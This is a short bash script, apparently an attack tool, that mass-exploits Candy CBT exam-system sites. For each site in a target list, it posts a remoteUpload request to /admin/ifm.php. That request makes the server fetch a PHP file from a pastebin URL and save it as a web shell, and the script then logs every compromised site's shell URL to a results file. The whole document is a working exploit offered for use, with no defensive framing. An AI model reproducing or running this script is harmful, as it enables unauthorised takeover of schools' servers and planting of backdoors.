#Simple Candy CBT Exploiter
#Multithreads Exploiter
#CBT V.2.7.0.r0
#Jevil36239
#exploit path /admin/ifm.php
#Finished by 14/SEP/2021 01:50
#please bro jangan
#laike rilly? cuma gini doang bjir bruh

clear
echo "
          _________________(- Candy CBT Exploiter -)_________________
                      __________________________________   
                               _________________               
"
echo ""
echo ""
read -p "Masukan List : " url;
read -p "Threads ( Default 10 ) : "  t;


buset(){
      local ngecurl=$(curl --silent -d 'api=remoteUpload&dir=&filename=ayayayayDIooo.php&method=curl&url=https://pastebin.com/raw/xX7DDa0m' --url $site/admin/ifm.php | grep -o 'File successfully uploaded')
      if [[ $ngecurl =~ 'File successfully uploaded' ]];
      then
      	echo -e "-$2/$cekbaris- (-Y-) $site\n"
      	echo "$site/files/ayayayayDIooo.php\n" | tee -a resultcbtshell.txt
      else
      	echo -ne "-$2/$cekbaris- (-T-) $site\n"
      fi
  }

if [[ $t="" ]]; then
	t=10;
fi

n=1
IFS=$'\r\n'
for site in $(cat $url); do
	f=$(expr $n % $t)
	cekbaris=$(cat $url | wc -l)
	buset $site $n &
	n=$[$n+1]
  done

